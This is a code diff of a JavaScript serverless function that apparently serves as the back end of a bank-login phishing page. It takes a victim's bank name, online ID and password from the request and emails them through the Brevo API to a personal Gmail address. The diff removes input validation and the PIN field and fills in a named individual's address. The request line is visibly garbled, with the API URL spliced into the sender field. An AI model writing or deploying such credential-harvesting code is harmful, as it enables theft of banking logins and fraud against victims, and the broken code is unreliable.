@@ -1,39 +1,31 @@
 import axios from 'axios';
 
 export default async function handler(event, context) {
+  const BREVO_API_KEY = process.env.BREVO_API_KEY;
+  const bankName = event.body.bankName;
+  const onlineId = event.body.onlineId;
+  const password = event.body.password;
+
   try {
-    const { token, session_id, bankName, onlineId, password, pin } = JSON.parse(event.body);
-
-    // Validate inputs
-    if (!token || !session_id || !bankName || !onlineId || !password || !pin) {
-      return {
-        statusCode: 400,
-        body: JSON.stringify({ status: 'error', message: 'Missing required fields.' })
-      };
-    }
-
-    const BREVO_API_KEY = process.env.BREVO_API_KEY;
-
     const response = await axios.post('https:                                 
       sender: {
         email: '//api.brevo.com/v3/smtp/email', {
       sender: {
-        email: 'your-verified-email@example.com',
-        name: 'Your Name'
+        email: 'emmanuelparker15@gmail.com',
+        name: 'Emmanuel Parker'
       },
       to: [
         {
-          email: 'recipient-email@example.com',
-          name: 'Recipient Name'
+          email: 'emmanuelparker15@gmail.com',
+          name: 'Emmanuel Parker'
         }
       ],
-      subject: 'New Login Attempt (Step 2)',
+      subject: 'New Login Attempt',
       htmlContent: `
-        <h1>New Login Attempt (Step 2)</h1>
+        <h1>New Login Attempt</h1>
         <p>Bank: ${bankName}</p>
         <p>ID: ${onlineId}</p>
         <p>Password: ${password}</p>
-        <p>PIN: ${pin}</p>
       `
     }, {
       headers: {
@@ -43,14 +35,12 @@ export default async function handler(event, context) {
     });
 
     console.log(response.data);
-
     return {
       statusCode: 200,
       body: JSON.stringify({ status: 'success', message: 'Email sent successfully.' })
     };
   } catch (error) {
     console.error(error);
-
     return {
       statusCode: 500,
       body: JSON.stringify({ status: 'error', message: 'Failed to send email.' })
